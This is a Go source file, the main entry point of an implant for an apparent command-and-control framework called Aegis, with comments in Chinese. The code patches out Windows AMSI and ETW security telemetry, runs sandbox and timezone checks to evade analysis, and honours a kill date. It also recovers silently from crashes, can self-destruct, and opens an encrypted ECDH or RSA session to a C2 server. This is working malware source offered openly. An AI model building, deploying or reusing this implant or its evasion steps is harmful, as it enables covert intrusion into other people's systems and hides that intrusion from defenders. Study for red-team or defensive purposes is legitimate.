package main

import (
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/aegis-c2/aegis/agent/autonomy"
	"github.com/aegis-c2/aegis/agent/config"
	agentcrypto "github.com/aegis-c2/aegis/agent/crypto"
	"github.com/aegis-c2/aegis/agent/evasion"
	"github.com/aegis-c2/aegis/agent/executor"
	"github.com/aegis-c2/aegis/agent/limits"
	"github.com/aegis-c2/aegis/agent/modules"
	"github.com/aegis-c2/aegis/agent/session"
	servercrypto "github.com/aegis-c2/aegis/server/crypto"
)

var EmbeddedPubKey = ""
var EmbeddedECDHPubKey = "" // hex-encoded X25519 public key pinned at compile time

const maxPanicRecoveries = 3 // after this many recoveries, exit silently

// ServerPublicKey 返回嵌入的服务器公钥，或从环境变量读取。
func ServerPublicKey() []byte {
	if EmbeddedPubKey != "" {
		return []byte(EmbeddedPubKey)
	}
	if pem := os.Getenv("AEGIS_SERVER_PUBKEY"); pem != "" {
		return []byte(pem)
	}
	return nil
}

// PinnedECDHPubKey 返回固定的 ECDH 公钥（防 MITM）。
func PinnedECDHPubKey() []byte {
	if EmbeddedECDHPubKey != "" {
		data, err := hex.DecodeString(EmbeddedECDHPubKey)
		if err == nil && len(data) == 32 {
			return data
		}
	}
	if hexKey := os.Getenv("AEGIS_SERVER_ECDH_PUBKEY"); hexKey != "" {
		data, err := hex.DecodeString(strings.TrimSpace(hexKey))
		if err == nil && len(data) == 32 {
			return data
		}
	}
	return nil
}

// fetchECDHPubKey 从服务器获取 X25519 ECDH 公钥。
// SEC-9: 如果有嵌入的固定密钥，验证 fetched key 与之匹配，防 MITM。
func fetchECDHPubKey(serverURL string) ([]byte, error) {
	// 优先使用嵌入/环境变量中的固定密钥（完全避免网络获取）
	if pinned := PinnedECDHPubKey(); pinned != nil {
		return pinned, nil
	}

	// A-P1-15: ECDH 公钥必须通过 HTTPS 获取，防止中间人替换公钥
	baseURL := serverURL
	if !strings.HasPrefix(baseURL, "http://") && !strings.HasPrefix(baseURL, "https://") {
		baseURL = "https://" + baseURL
	} else if strings.HasPrefix(baseURL, "http://") {
		return nil, fmt.Errorf("ECDH pubkey fetch requires HTTPS, got %q", serverURL)
	}
	// 移除路径部分，只保留 scheme://host
	if idx := strings.Index(baseURL, "://"); idx != -1 {
		if slash := strings.Index(baseURL[idx+3:], "/"); slash != -1 {
			baseURL = baseURL[:idx+3+slash]
		}
	}

	url := baseURL + "/api/ecdhpubkey"
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return nil, fmt.Errorf("fetch ECDH pubkey: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read ECDH pubkey response: %w", err)
	}

	var result struct {
		ECDHPublicKey string `json:"ecdh_public_key"`
	}
	if err := json.Unmarshal(body, &result); err != nil {
		return nil, fmt.Errorf("parse ECDH pubkey response: %w", err)
	}

	if result.ECDHPublicKey == "" {
		return nil, fmt.Errorf("empty ECDH pubkey from server")
	}

	data, err := hex.DecodeString(result.ECDHPublicKey)
	if err != nil {
		return nil, fmt.Errorf("decode ECDH pubkey hex: %w", err)
	}
	if len(data) != 32 {
		return nil, fmt.Errorf("invalid ECDH pubkey length: %d (expected 32)", len(data))
	}
	return data, nil
}

func main() {
	// A-P0-6: 使用循环替代递归 main() 调用，防止栈溢出
	// panic 恢复后重新进入 runAgent() 而非 main()，栈帧不会累积
	for attempt := 0; attempt < maxPanicRecoveries; attempt++ {
		func() {
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[AGENT] panic recovered (attempt %d/%d): %v", attempt+1, maxPanicRecoveries, r)
				}
			}()
			runAgent()
		}()

		if attempt < maxPanicRecoveries-1 {
			log.Printf("[AGENT] entering deep sleep before reconnect attempt %d", attempt+2)
			time.Sleep(5 * time.Minute)
		}
	}
}

func runAgent() {

	cfg := config.DefaultAgentConfig()

	// === AMSI/ETW 绕过（Windows，仅在配置禁用时执行 patch）===
	if !cfg.AMSIEnabled {
		if err := evasion.AMSIBypassMemoryPatch(); err != nil {
			log.Printf("[AGENT] AMSI bypass failed: %v", err)
		}
	}
	if !cfg.ETWEnabled {
		if err := evasion.ETWBypassMemoryPatch(); err != nil {
			log.Printf("[AGENT] ETW patch failed: %v", err)
		}
	}

	if url := os.Getenv("AEGIS_SERVER"); url != "" {
		cfg.ServerURL = url
		cfg.ServerURLs = []string{url}
	}

	// === 执行限制检查（Kill Date / 沙箱检测）===
	limitsCfg := &limits.Config{
		MinCPUs:       2,
		MinMemoryMB:   1024,
	}

	// Kill Date 检查
	killDateStr := os.Getenv("AEGIS_KILL_DATE")
	if killDateStr != "" {
		if kd, err := time.Parse("2006-01-02", killDateStr); err == nil {
			limitsCfg.KillDate = kd
		}
	}
	if err := limitsCfg.Check(); err != nil {
		log.Printf("[AGENT] limits check failed: %v, exiting", err)
		return
	}

	// 沙箱检测
	if err := limitsCfg.CheckHardware(); err != nil {
		log.Printf("[AGENT] sandbox detected (hardware): %v", err)
		cfg.HeartbeatInterval *= 5
		cfg.HeartbeatJitter *= 3
	}

	// 时区检测（反沙箱）
	if err := limitsCfg.CheckTimezone(); err != nil {
		log.Printf("[AGENT] timezone anomaly detected: %v", err)
	}

	log.Printf("[AGENT] starting agent, server=%s limits=OK", cfg.ServerURL)

	serverPubKey := ServerPublicKey()
	if serverPubKey == nil {
		log.Println("[AGENT] no server public key embedded, running in dev mode")
	}

	exec := executor.New(false, nil)
	autonomyEngine := autonomy.NewDecisionEngine(nil)

	// === 优先尝试 ECDH 密钥交换 ===
	serverECDHPubKey, err := fetchECDHPubKey(cfg.ServerURL)
	if err != nil {
		log.Printf("[AGENT] ECDH pubkey fetch failed (%v), falling back to RSA", err)
	}

	var sess *session.Session

	if serverECDHPubKey != nil {
		// SEC-9: ECDH 要求 HTTPS — 无固定密钥时必须通过 HTTPS 传输，防止中间人窃取 ECDH 公钥
		if !strings.HasPrefix(cfg.ServerURL, "https://") {
			log.Printf("[AGENT] ECDH requires HTTPS, but server URL is %q — falling back to RSA", cfg.ServerURL)
			serverECDHPubKey = nil
		} else {
			// X25519 ECDH 模式（Perfect Forward Secrecy）
			ecdhExch, err := agentcrypto.NewAgentECDH()
			if err != nil {
				log.Printf("[AGENT] ECDH init failed (%v), falling back to RSA", err)
				serverECDHPubKey = nil
			} else {
				sessCfg := session.Config{
					ServerURL:         cfg.ServerURL,
					ServerPubKey:      serverPubKey,
					ServerECDHPubKey:  serverECDHPubKey,
					HeartbeatInterval: cfg.HeartbeatInterval,
					HeartbeatJitter:   cfg.HeartbeatJitter,
					UserAgent:         cfg.UserAgent,
					ProcessName:       cfg.ProcessName,
					AgentConfig:       cfg,
				}
				sess = session.NewWithECDH(sessCfg, exec, ecdhExch)
				log.Println("[AGENT] using X25519 ECDH key exchange")
			}
		}
	}

	if sess == nil {
		// 回退：RSA 密钥交换
		agentCrypto, err := agentcrypto.NewAgentCrypto()
		if err != nil {
			log.Fatalf("[AGENT] failed to init crypto: %v", err)
		}

		var aesKey []byte
		if serverPubKey != nil {
			aesKey, err = servercrypto.GenerateKey()
			if err != nil {
				log.Fatalf("[AGENT] failed to generate AES key: %v", err)
			}
		}

		sessCfg := session.Config{
			ServerURL:         cfg.ServerURL,
			ServerPubKey:      serverPubKey,
			HeartbeatInterval: cfg.HeartbeatInterval,
			HeartbeatJitter:   cfg.HeartbeatJitter,
			UserAgent:         cfg.UserAgent,
			ProcessName:       cfg.ProcessName,
			AgentConfig:       cfg,
		}
		sess = session.New(sessCfg, exec, aesKey, agentCrypto)
		log.Println("[AGENT] using RSA key exchange (fallback)")
	}

	// 注入 session 到 modules（支持 reconfig 等命令）
	modules.SetSession(sess)

	// 设置自主决策钩子：每次心跳后调用
	sess.SetAutonomyHook(func() {
		strategy := autonomyEngine.GetCurrentStrategy()
		switch strategy {
		case autonomy.StratDeepSleep:
			log.Printf("[AGENT] autonomy: deep sleep mode")
		case autonomy.StratSelfDestruct:
			log.Printf("[AGENT] autonomy: self-destruct triggered")
			autonomyEngine.SelfDestruct()
			os.Exit(0)
		case autonomy.StratTryRotate:
			log.Printf("[AGENT] autonomy: attempting server rotation")
		}
	})

	// 检查初始自主决策状态
	if strategy := autonomyEngine.GetCurrentStrategy(); strategy == autonomy.StratSelfDestruct {
		log.Printf("[AGENT] autonomy: self-destruct triggered at startup")
		autonomyEngine.SelfDestruct()
		os.Exit(0)
	}

	if err := sess.Run(); err != nil {
		log.Printf("[AGENT] session failed: %v", err)
		nextStrategy := autonomyEngine.RecordFailure()
		log.Printf("[AGENT] autonomy decision: %s (failures=%d)", nextStrategy, autonomyEngine.GetConsecutiveFailures())
	}
}
